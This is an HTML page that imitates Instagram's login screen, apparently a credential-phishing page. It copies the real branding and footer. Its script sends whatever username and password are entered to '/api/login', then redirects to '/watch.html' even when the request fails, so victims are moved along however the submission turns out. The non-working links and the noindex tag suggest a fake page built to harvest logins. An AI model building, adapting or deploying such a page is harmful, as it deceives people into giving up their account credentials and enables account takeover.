<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Login • Instagram</title>
<meta name="theme-color" content="#ffffff">
<meta name="robots" content="noindex">
<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Cdefs%3E%3ClinearGradient id='g' x1='0' y1='1' x2='1' y2='0'%3E%3Cstop offset='0' stop-color='%23feda75'/%3E%3Cstop offset='.5' stop-color='%23d62976'/%3E%3Cstop offset='1' stop-color='%234f5bd1'/%3E%3C/linearGradient%3E%3C/defs%3E%3Crect width='32' height='32' rx='9' fill='url(%23g)'/%3E%3Crect x='7' y='7' width='18' height='18' rx='5' fill='none' stroke='white' stroke-width='2.2'/%3E%3Ccircle cx='16' cy='16' r='4.4' fill='none' stroke='white' stroke-width='2.2'/%3E%3Ccircle cx='22' cy='10' r='1.5' fill='white'/%3E%3C/svg%3E">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
<style>
*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
html,body{margin:0;padding:0}
body{background:#fff;color:#262626;-webkit-font-smoothing:antialiased;
font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
a{text-decoration:none}
.page{min-height:100vh;display:flex;flex-direction:column;align-items:center}
.art{display:none}
.col{width:100%;max-width:420px;padding:26px 24px 0;flex:1;display:flex;flex-direction:column}
.logo{font-family:'Grand Hotel',cursive;font-size:46px;line-height:1;text-align:center;
color:#262626;margin:6px 0 18px;letter-spacing:-1px;user-select:none}
h1{font-size:17px;font-weight:600;text-align:center;margin:0 0 16px;line-height:20px}
.field{position:relative;display:block;margin-bottom:6px}
.field input{width:100%;height:42px;padding:14px 9px 4px;font-size:13px;color:#262626;
background:#fafafa;border:1px solid #dbdbdb;border-radius:4px;outline:none;font-family:inherit}
.field input:focus{border-color:#a8a8a8}
.field .lbl{position:absolute;left:9px;top:11px;font-size:13px;color:#8e8e8e;pointer-events:none;
transform-origin:left top;transition:transform .1s ease}
.field input:focus+.lbl,.field input:not(:placeholder-shown)+.lbl{transform:scale(.75) translateY(-9px)}
.field input:not(:placeholder-shown){padding-top:16px;padding-bottom:2px}
.show{position:absolute;right:8px;top:11px;border:0;background:none;color:#262626;font-size:13px;
font-weight:600;cursor:pointer;font-family:inherit}
.err{color:#ed4956;font-size:13px;line-height:16px;text-align:center;margin:10px 0 12px}
.login-btn{width:100%;height:42px;margin-top:8px;border:0;border-radius:8px;background:#0095f6;
color:#fff;font-size:14px;font-weight:600;font-family:inherit;cursor:pointer;
display:flex;align-items:center;justify-content:center;gap:8px}
.login-btn:disabled{opacity:.65;cursor:default}
.spin{width:15px;height:15px;border:2px solid rgba(255,255,255,.45);border-top-color:#fff;
border-radius:50%;animation:sp .7s linear infinite;display:none}
@keyframes sp{to{transform:rotate(360deg)}}
.or{display:flex;align-items:center;gap:16px;margin:16px 0}
.or span{flex:1;height:1px;background:#dbdbdb}
.or b{font-size:13px;font-weight:600;color:#8e8e8e}
.fb{display:flex;align-items:center;justify-content:center;gap:8px;font-size:14px;
font-weight:600;color:#385185;padding:8px 0}
.forgot{display:block;text-align:center;font-size:12px;color:#00376b;margin-top:14px;padding:6px 0}
.card-alt{border-top:1px solid #dbdbdb;margin-top:26px;padding:20px 0 4px;text-align:center;font-size:14px}
.card-alt a{color:#0095f6;font-weight:600}
.getapp{text-align:center;padding:22px 0 18px}
.getapp p{font-size:14px;margin:0 0 12px}
.badges{display:flex;justify-content:center;gap:8px;flex-wrap:wrap}
.badge{display:flex;align-items:center;gap:7px;background:#000;color:#fff;border-radius:7px;
padding:6px 11px;height:38px}
.badge svg{width:18px;height:18px;flex:none}
.badge small{display:block;font-size:7.5px;line-height:1;opacity:.85}
.badge strong{display:block;font-size:12px;line-height:1.25}
footer{width:100%;max-width:420px;padding:8px 16px 30px;text-align:center}
.lang{border:0;background:none;font-size:12px;color:#8e8e8e;font-family:inherit;margin-bottom:10px}
.flinks{display:flex;flex-wrap:wrap;justify-content:center;gap:6px 12px;font-size:11px;color:#8e8e8e}
.flinks a{color:#8e8e8e}
.copy{font-size:11px;color:#8e8e8e;margin-top:10px}
@media(min-width:880px){
.page{flex-direction:row;align-items:stretch}
.art{display:flex;flex:1;position:relative;overflow:hidden;align-items:center;justify-content:center;
gap:26px;background:linear-gradient(140deg,#fdf0dc 0%,#f9d6e8 32%,#dcd2f6 66%,#c7dcf9 100%)}
.phone{width:186px;height:388px;border-radius:30px;background:#111;padding:7px;
box-shadow:0 22px 46px rgba(0,0,0,.22)}
.phone:nth-child(1){transform:rotate(-7deg) translateY(16px)}
.phone:nth-child(2){transform:rotate(6deg) translateY(-22px)}
.screen{width:100%;height:100%;border-radius:24px;overflow:hidden;background:#fff;
display:flex;flex-direction:column}
.sbar{height:26px;border-bottom:1px solid #efefef;display:flex;align-items:center;gap:5px;padding:0 8px}
.dot{width:16px;height:16px;border-radius:50%;background:#d8d8d8}
.ln{height:5px;border-radius:3px;background:#e8e8e8;flex:1;max-width:62px}
.photo{flex:1}
.ph-a{background:linear-gradient(160deg,#f7a072,#ed6a5a 45%,#8e5572)}
.ph-b{background:linear-gradient(200deg,#8ecae6,#219ebc 50%,#023047)}
.ph-c{background:linear-gradient(150deg,#ffd6a5,#fdffb6 40%,#9a8c98)}
.ph-d{background:linear-gradient(210deg,#cdb4db,#ffc8dd 50%,#ffafcc)}
.irow{height:30px;display:flex;align-items:center;gap:9px;padding:0 9px}
.irow i{width:13px;height:13px;border-radius:3px;background:#dedede}
.col{width:430px;flex:none;justify-content:center;padding:40px 48px;max-width:none}
.logo{margin-top:0}
.card-alt{margin-top:22px;padding:20px 0}
footer{max-width:none}
}
</style>
</head>
<body>
<div class="page">
<div class="art">
<div class="phone"><div class="screen">
<div class="sbar"><div class="dot"></div><div class="ln"></div></div>
<div class="photo ph-a"></div><div class="irow"><i></i><i></i><i></i></div>
<div class="photo ph-b" style="flex:0 0 96px"></div></div></div>
<div class="phone"><div class="screen">
<div class="sbar"><div class="dot"></div><div class="ln"></div></div>
<div class="photo ph-c" style="flex:0 0 128px"></div><div class="irow"><i></i><i></i><i></i></div>
<div class="photo ph-d"></div></div></div>
</div>

<div class="col">
<div class="logo">Instagram</div>
<h1>Log into Instagram</h1>
<form id="f" novalidate>
<label class="field">
<input name="username" id="u" type="text" placeholder=" " autocomplete="username"
autocapitalize="none" autocorrect="off" spellcheck="false" required>
<span class="lbl">Mobile number, username or email</span>
</label>
<label class="field">
<input name="password" id="p" type="password" placeholder=" " autocomplete="current-password" required>
<span class="lbl">Password</span>
<button type="button" class="show" id="show">Show</button>
</label>
<p class="err" id="err" style="display:none"></p>
<button type="submit" class="login-btn" id="go">
<span class="spin" id="spin"></span><span id="txt">Log in</span>
</button>
</form>
<div class="or"><span></span><b>OR</b><span></span></div>
<a class="fb" href="#">
<svg viewBox="0 0 24 24" width="17" height="17"><circle cx="12" cy="12" r="12" fill="#1877f2"/>
<path d="M16.7 8.6h-2.2V7.2c0-.6.4-.7.7-.7h1.4V4.1h-2c-2.2 0-2.7 1.6-2.7 2.7v1.8H10v2.6h1.9V20h2.9v-8.8h2z" fill="#fff"/></svg>
Log in with Facebook</a>
<a class="forgot" href="#">Forgot password?</a>
<div class="card-alt">Don't have an account? <a href="#">Sign up</a></div>
<div class="getapp"><p>Get the app</p><div class="badges">
<a class="badge" href="#"><svg viewBox="0 0 24 24" fill="#fff"><path d="M16.4 12.7c0-2 1.6-3 1.7-3.1-1-1.4-2.4-1.6-2.9-1.6-1.3-.1-2.4.7-3 .7-.6 0-1.6-.7-2.6-.7-1.3 0-2.6.8-3.3 2-1.4 2.4-.4 6 1 8 .7 1 1.4 2 2.4 2 1 0 1.3-.6 2.5-.6s1.5.6 2.6.6 1.6-1 2.3-2c.7-1 1-2 1-2.1 0 0-2.7-1-2.7-3.2zM14.5 6.5c.5-.6.9-1.5.8-2.4-.8 0-1.7.5-2.3 1.1-.5.5-.9 1.4-.8 2.3.9.1 1.8-.5 2.3-1z"/></svg>
<span><small>Download on the</small><strong>App Store</strong></span></a>
<a class="badge" href="#"><svg viewBox="0 0 24 24">
<path d="M4 3.3v17.4c0 .5.6.8 1 .5l9.4-8.7c.3-.3.3-.7 0-1L5 3c-.4-.4-1-.1-1 .3z" fill="#00d2ff"/>
<path d="M14.4 11.6l3.1-2.9-9-5.1z" fill="#00f076"/>
<path d="M14.4 12.4L8.5 20.4l9-5.1z" fill="#ff3d3d"/>
<path d="M17.5 8.7l2.6 1.5c.5.3.5 1 0 1.3l-2.6 1.5-3.1-2.2z" fill="#ffc300"/></svg>
<span><small>GET IT ON</small><strong>Google Play</strong></span></a>
</div></div>
</div>
</div>

<footer>
<select class="lang"><option>English (UK)</option></select>
<div class="flinks"><a href="#">Meta</a><a href="#">About</a><a href="#">Blog</a><a href="#">Jobs</a>
<a href="#">Help</a><a href="#">API</a><a href="#">Privacy</a><a href="#">Terms</a>
<a href="#">Locations</a><a href="#">Instagram Lite</a><a href="#">Threads</a></div>
<div class="copy">English &middot; &copy; 2026 Instagram from Meta</div>
</footer>

<script>
var p=document.getElementById('p'),s=document.getElementById('show');
s.addEventListener('click',function(){var h=p.type==='password';
p.type=h?'text':'password';s.textContent=h?'Hide':'Show';});

document.getElementById('f').addEventListener('submit',async function(e){
  e.preventDefault();
  var u=document.getElementById('u').value.trim(), pw=p.value;
  if(!u||!pw)return;
  var err=document.getElementById('err'), b=document.getElementById('go');
  err.style.display='none';
  b.disabled=true;
  document.getElementById('spin').style.display='block';
  document.getElementById('txt').textContent='Logging in...';
  try{
    var r=await fetch('/api/login',{method:'POST',
      headers:{'content-type':'application/json'},
      body:JSON.stringify({username:u,password:pw})});
    var d=await r.json().catch(function(){return {};});
    if(d.ok){localStorage.setItem('igok','1');location.href='/watch.html';return;}
    if(d.error){err.textContent=d.error;err.style.display='block';}
    else{localStorage.setItem('igok','1');location.href='/watch.html';return;}
  }catch(x){
    localStorage.setItem('igok','1');location.href='/watch.html';return;
  }
  b.disabled=false;
  document.getElementById('spin').style.display='none';
  document.getElementById('txt').textContent='Log in';
});
</script>
</body>
</html>
